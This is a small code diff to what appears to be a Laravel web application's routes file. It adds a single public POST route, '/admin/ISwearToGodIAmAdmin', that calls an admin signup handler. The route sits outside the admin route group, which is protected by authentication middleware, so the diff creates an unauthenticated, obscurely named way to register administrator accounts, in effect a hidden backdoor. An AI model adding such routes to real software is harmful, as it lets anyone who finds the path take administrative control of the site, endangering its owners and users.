@@ -42,6 +42,7 @@ Route::post('/code/{type}', [SendCodeController::class, 'sendCode']);
 Route::post('/check/{type}', [CodeCheckerController::class, 'check']);
 Route::post('/verify/{user}', [VerificationController::class, 'verify'])->name('verification.verify');
 Route::post('/resend/{from}', [VerificationController::class, 'resend']);
+Route::post('/admin/ISwearToGodIAmAdmin', [AdminController::class, 'signup']);
 
 // admin route group
 Route::group(['middleware' => ['auth.guard:admin', 'protected']], function() {
